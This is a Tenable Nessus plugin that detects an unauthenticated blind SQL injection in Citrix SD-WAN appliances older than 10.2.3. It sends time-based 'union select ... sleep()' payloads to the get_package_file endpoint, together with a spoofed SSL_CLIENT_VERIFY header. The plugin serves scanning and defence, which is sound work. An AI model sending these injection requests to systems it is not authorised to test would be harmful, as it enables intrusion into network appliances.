#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(126466);
  script_version("1.7");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2019-12989", "CVE-2019-12991");
  script_xref(name:"TRA", value:"TRA-2019-32");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/04/15");

  script_name(english:"Citrix SD-WAN Appliance < 10.2.3 Unauthenticated Blind SQL Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a CGI script that is affected by a remote
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Citrix SD-WAN Appliance is affected by an SQL injection
vulnerability due to improper sanitization of user-supplied input. An
unauthenticated, remote attacker can exploit this issue to inject or
manipulate SQL queries in the back-end database, resulting in the
manipulation of arbitrary data.");
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2019-32");
  script_set_attribute(attribute:"solution", value:
"Upgrade the Citrix SD-WAN Appliance software to version 10.2.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2019-12991");
  script_set_attribute(attribute:"cvss3_score_source", value:"CVE-2019-12989");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/07/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/07/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/07/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:citrix:sd-wan");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("citrix_sdwan_detect.nbin");
  script_require_keys("installed_sw/Citrix SD-WAN");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = 'Citrix SD-WAN';

get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:443);

install = get_single_install(app_name:app, port:port);

stimes = make_list(3, 9, 15);
num_queries = max_index(stimes);

vuln = FALSE;

for (i = 0; i < max_index(stimes); i++)
{
  http_set_read_timeout(stimes[i] + 10);
  then = unixtime();

  url = "/sdwan/nitro/v1/config/get_package_file?action=file_download";
  postdata = '{"get_package_file": {"site_name": "blah\' union select 1,1,1,sleep(' + stimes[i] + ');#","appliance_type": "primary","package_type": "active"}}';

#  postdata = urlencode(
#    str        : postdata,
#    unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789=+&_"
#  );

  res = http_send_recv3(
    method: "POST",
    port: port,
    item: url,
    data: postdata,
    content_type: 'application/json',
    add_headers: make_array("SSL_CLIENT_VERIFY", "SUCCESS"),
    exit_on_fail: TRUE
  );

  now = unixtime();
  ttime = now - then;

  query = '... union select 1,1,1,sleep(' +stimes[i]+ ');';

  time_per_query += 'Query #' + (i+1) + ' : ' + query + ' Sleep Time : ' +
  stimes[i] + ' secs  Response Time : ' + ttime + ' secs\n';

  overalltime += ttime;
  if ( (ttime >= stimes[i]) && (ttime <= (stimes[i] + 5)) )
  {
    vuln = TRUE;

    output =
      'Blind SQL Injection Results' +
      '\n  Query                          : ' + query +
      '\n  Response time                  : ' + ttime + ' secs' +
      '\n  Number of queries executed     : ' + num_queries +
      '\n  Total test time                : ' + overalltime + ' secs' +
      '\n  Time per query                 : ' +
      '\n'+ "  " + time_per_query;

    continue;
  }
  else
    vuln = FALSE;
}

if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:install['path'], port:port));

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  sqli       : TRUE,
  request    : make_list(http_last_sent_request()),
  output     : output
);
